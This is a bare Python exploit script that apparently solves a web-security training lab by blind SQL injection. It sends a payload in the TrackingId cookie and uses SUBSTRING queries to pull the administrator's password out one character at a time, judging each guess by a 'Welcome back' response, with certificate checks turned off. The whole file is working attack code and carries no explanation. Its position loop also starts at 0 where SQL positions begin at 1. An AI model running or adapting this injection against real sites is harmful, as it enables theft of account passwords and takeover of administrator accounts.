import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a4a00ad04b79da3809b3aca001c0089.web-security-academy.net/filter?category=Gifts"

charset_0 = (
    '0123456789' +
    'abcdefghijklmnopqrstuvwxyz' 
)

result = ""

for i in range(26):
    for value in charset_0:
        payload = f"NZcqkoH3aH19zJxm' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{value}"
        cookies = {
            'TrackingId': payload,
            'session': 'qcBXxl3MUlkR9fFCZaFJ44ZZnyMoDTP1'
        }
        res = requests.get(url, cookies=cookies, verify=False)
        r = res.text
        if "Welcome back" in r:
            result += value
            break
        else:
            pass

print(result)
